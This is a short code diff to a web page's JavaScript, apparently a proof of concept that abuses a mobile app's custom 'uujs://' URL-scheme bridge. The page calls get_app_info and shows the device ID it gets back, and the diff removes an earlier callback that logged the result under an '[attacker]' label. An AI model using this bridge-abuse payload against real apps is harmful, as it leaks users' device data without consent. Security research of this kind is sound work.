@@ -81,9 +81,14 @@
         document.body.appendChild(iframe);
     }
 
-    function mycallback(res) {
-        console.log("[attacker]: " + JSON.stringify(res) );
+    function callback_get_app_info(res) {
+        var json = res;
+        document.getElementById("DeviceID").innerText = "Your DeviceID: " + json.app_info.DeviceId;
     }
+    setTimeout(function() {
+        fetchData('uujs://get_app_info?data={"callback":"callback_get_app_info","callback_id":"noMatterWhat"}');
+    }, 1000);
+
 
 
     // function mycallback_101(res) {
